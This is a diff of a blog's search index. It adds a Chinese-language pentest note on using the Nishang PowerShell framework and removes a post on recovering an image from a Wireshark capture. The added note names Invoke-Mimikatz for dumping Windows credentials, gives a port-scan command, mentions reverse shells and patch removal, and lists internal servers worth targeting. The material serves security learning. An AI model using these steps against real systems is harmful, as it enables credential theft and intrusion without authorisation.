+<blockquote>
+<p>NiShang简介：</p>
+<p>利用Powershell，攻击者可以在无需接触磁盘的情况下<strong>执行命令</strong>等，并且相较已经被广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。</p>
+<p>Nishang是基于PowerShell的渗透测试专用工具。它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。（类似于MSF）</p>
+</blockquote>
+<p>nishang使用：</p>
+<ol>
+<li><p>进入powershell，进入nishang目录</p>
+</li>
+<li><p>设置执行策略（第一次运行先设置执行策略）：<code>Set-ExecutionPolicy RemoteSigned</code></p>
+<blockquote>
+<p>权限不够的话要以管理员身份运行powershell</p>
+</blockquote>
+</li>
+<li><p>导入模块 nishang：<code>Import-Module .\nishang.psm1</code></p>
+</li>
+<li><p>获取模块 nishang 的命令函数：<code>Get-Command -Module nishang</code>（每个参数对应一个功能模块）</p>
+</li>
+<li><p>可以调用Invoke-Mimikatz的功能（查询本地Windows的账号密码）</p>
+</li>
+<li><p>获取常规计算机信息：Get-Information</p>
+</li>
+<li><p>端口扫描（查看目录对应文件有演示语法，其他函数同理）：<code>Invoke-PortScan -StartAddress 192.168.3.21 -EndAddress 192.168.3.31 -ResolveHost -ScanPort</code></p>
+</li>
+<li><p>其他功能：<strong>删除补丁</strong>，<strong>反弹 Shell</strong>，<strong>凭据获取</strong>等</p>
+</li>
+</ol>
+<p>核心业务机器（渗透内网的第一条服务器的角色）:</p>
+<ol>
+<li>高级管理人员、系统管理员、财务/人事/业务人员的个人计算机</li>
+<li><p>产品管理系统服务器</p>
+</li>
+<li><p>办公系统服务器</p>
+</li>
+<li><p>财务应用系统服务器</p>
+</li>
+<li><p>核心产品源码服务器（自建 SVN、GIT）</p>
+</li>
+<li><p>数据库服务器</p>
+</li>
+<li><p>文件或网盘服务器、共享服务器</p>
+</li>
+<li><p>电子邮件服务器</p>
+</li>
+<li><p>网络监控系统服务器</p>
+</li>
+<li><p>其他服务器（内部技术文档服务器、其他监控服务器等）</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -3116,39 +3306,6 @@
       <tags>
         <tag>web</tag>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>传输文件还原</title>
-    <url>/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/</url>
-    <content><![CDATA[<h1 id="一、配置环境"><a href="#一、配置环境" class="headerlink" title="一、配置环境"></a>一、配置环境</h1><p>将手机和PC连到同一子网下（如GUET-WiFi）</p>
-<p>手机IP：<code>10.33.80.238</code></p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/1.png" alt></p>
-<p>PC的IP：<code>10.33.35.83</code></p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/2.png" alt></p>
-<h1 id="二、WireShark抓包"><a href="#二、WireShark抓包" class="headerlink" title="二、WireShark抓包"></a>二、WireShark抓包</h1><p>打开WireShark，选择WLAN过滤器</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/3.png" alt></p>
-<p>然后在过滤出resource IP是手机IP的数据包：<code>ip.src == 10.33.80.238</code></p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/4.png" alt></p>
-<p>通过QQ从手机发送一张图片给PC，此时WireShark会截获大量数据包，找到其中一个是HTTP协议的数据包</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/5.png" alt></p>
-<p>右键单击然后选择追踪TCP流</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/6.png" alt></p>
-<p>然后在下面展示数据的格式中选择原始数据（raw data）</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/7.png" alt></p>
-<p>然后将这些原始数据另存为一个新文件即可</p>
-<h1 id="三、还原文件"><a href="#三、还原文件" class="headerlink" title="三、还原文件"></a>三、还原文件</h1><p>用十六进制编辑器（010 Editor）打开该文件，找到图片的十六进制文件头（FFD8FF）</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/8.png" alt></p>
-<p>然后删除该文件头之前的所有数据</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/9.png" alt></p>
-<p>然后保存，修改文件后缀名为图片格式（jpg）即可成功打开该图片</p>
-<p><img src="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/10.png" alt></p>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
       </tags>
   </entry>
 </search>
